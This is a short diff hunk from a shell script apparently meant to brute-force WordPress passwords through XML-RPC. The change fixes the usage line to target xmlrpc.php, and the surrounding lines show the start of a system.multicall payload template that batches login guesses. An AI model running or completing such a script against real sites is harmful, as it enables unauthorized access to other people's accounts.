@@ -2,7 +2,7 @@
 # Bruteforce single Wordpress XMLRPC
 # Created: 21-06-2021
 # Script Author : Chi Vo
-# Usage: sh wordpress-xmlrpc.sh http://localhost/wp-login.php admin pass.txt
+# Usage: sh wordpress-xmlrpc.sh http://localhost/xmlrpc.php admin pass.txt
 
 prefix=" \
 <?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data> \
